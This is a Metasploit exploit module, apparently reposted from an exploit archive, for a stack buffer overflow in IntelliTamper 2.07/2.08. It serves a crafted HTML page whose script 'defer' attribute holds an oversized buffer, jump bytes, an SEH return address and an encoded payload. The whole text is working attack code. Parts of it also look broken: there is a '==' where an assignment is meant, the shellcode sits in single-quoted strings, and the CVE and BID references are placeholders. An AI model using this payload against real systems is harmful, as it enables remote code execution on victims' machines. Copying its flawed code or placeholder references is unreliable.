IntelliTamper 2.07/2.08 (defer) Remote Buffer Overflow (meta)
=============================================================


##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
 
    include Msf::Exploit::Remote::HttpServer::HTML
    include Msf::Exploit::Remote::Seh
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;IntelliTamper 2.07/2.08 (defer) Remote Buffer Overflow &#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a stack overflow in the IntelliTamper.
                    By sending an overly long string to the "defer"
                    script, an attacker may be able to execute arbitrary code.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         => [ &#039;Stack, Mountassif Moad&#039; ],
            &#039;Version&#039;        =>  &#039;$Revision$&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/11220&#039;],
                    [ &#039;CVE&#039;, &#039;2009-0&#039; ],
                    [ &#039;OSVDB&#039;, &#039;0&#039; ],
                    [ &#039;BID&#039;, &#039;00, 01&#039; ],
                    [ &#039;EDB&#039;, &#039;11220&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;         => 950,
                    &#039;BadChars&#039;      => "\x00\x3C\x01",
                    &#039;StackAdjustment&#039; => -3500,
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;IntelliTamper 2.07/2.08&#039;,     { &#039;Offset&#039; => 6236, &#039;Ret&#039; => 0x0040103b } ], #  intellitamper.exe
                ],
            &#039;DisclosureDate&#039; => &#039;Jan 22 2009&#039;,
            &#039;DefaultTarget&#039;  => 0))
    end
 
 
    def on_request_uri(cli, request)
        # Re-generate the payload
        return if ((p = regenerate_payload(cli)) == nil)
 
        # Set the exploit buffer
 
        sploit == &#039;<html><head><title>loneferret test</title></head><body>&#039;
        sploit += &#039;<script defer="&#039;
        sploit += "\x41" * 6236
        sploit += make_nops(180)
        sploit += &#039;\xE9\x55\xFE\xFF\xFF&#039;
        sploit += &#039;\xeb\xd0\x90\x90&#039;
        sploit += [target.ret].pack(&#039;V&#039;)
        sploit += make_nops(50)
        sploit += payload.encoded
        sploit += &#039;">&#039;
        sploit +=  &#039;</body></html>&#039;
        print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")
 
        # Transmit the response to the client
        send_response_html(cli, sploit)
 
        # Handle the payload
        handler(cli)
    end
 
end



